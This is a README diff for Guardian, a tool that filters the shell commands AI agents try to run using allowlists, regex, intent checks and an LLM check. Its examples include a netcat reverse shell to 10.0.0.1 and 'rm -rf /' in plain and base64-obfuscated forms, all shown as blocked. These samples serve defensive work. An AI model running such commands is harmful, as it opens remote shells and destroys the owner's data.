@@ -14,39 +14,38 @@ AI agents can run shell commands on your machine. Guardian decides which ones ac
 
 AI agent frameworks often provide LLMs with direct shell access to complete tasks. In most implementations, security relies entirely on the model's willingness to follow system instructions. But model compliance is not the same thing as security enforcement.
 
-## See it in action
+## Quick Start (for Juniors) 🚀
 
-```
-task:    "list files"
-command: "nc -e /bin/bash 10.0.0.1 4444"
-layer:   L1 — Binary Allowlist
-verdict: BLOCKED
-reason:  Binary 'nc' is in the red-zone/not permitted in this context.
-```
+Experience the protection in 60 seconds:
 
-```
-task:    "check disk"
-command: "$(echo cm0gLXJmIC8= | base64 -d)"
-layer:   L2 — Regex Engine
-verdict: BLOCKED
-reason:  Obfuscation pattern detected (base64 decoding in shell command).
-```
+1. **Deploy:** `docker-compose up -d`
+2. **Attack:** `./demo.sh`
 
-```
-task:    "analyze disk usage"
-command: "rm -rf /tmp"
-layer:   L3 — Intent Coherence
-verdict: BLOCKED
-reason:  Task intent is 'read/analyze', command action is 'delete'. Conflict detected. ← This is L3: Intent Coherence. The differentiator.
-```
+Watch as Guardian intercepts obfuscated payloads and intent-conflicting commands in real-time.
 
-```
-task:    "clean temp files"
-command: "find /tmp -mtime +7 -delete"
-layer:   L4 — LLM Semantic Check
-verdict: ALLOWED
-reason:  Ambiguous use of 'delete' is justified by the task intent 'clean temp files'.
-```
+---
+
+## Defense Pipeline (for Seniors) 🛡️
+
+Guardian implements a deterministic, multi-layered security middleware. It does **not** rely solely on LLM "good behavior."
+
+### L1 — Binary Allowlist
+Strict enforcement of permitted binaries. If it's not in the allowlist (e.g., `nc`, `nmap`), it's blocked before any LLM is even called.
+
+### L2 — Regex Engine
+Detects obfuscation techniques (base64 decoding in shell), dangerous flags (`--no-preserve-root`), and known exploit patterns.
+
+### L3 — Intent Coherence
+Cross-references the high-level **Task Intent** (what the user asked) with the **Command Action** (what the code does).
+*   *Task:* "List files" → *Command:* `rm -rf /` = **BLOCKED** (Intent conflict).
+
+### L4 — LLM Semantic Check
+Deep semantic analysis of complex or ambiguous commands. Uses a **Fail-Closed** logic: if the LLM is unavailable or the response is malformed, the command is blocked.
+
+### Forensic Integrity
+Audit logs are protected by **Chain Hashing** (SHA-256). Each log entry is cryptographically linked to the previous one, ensuring the "Chain of Custody" and making log tampering detectable.
+
+---
 
 ## Why this exists
 
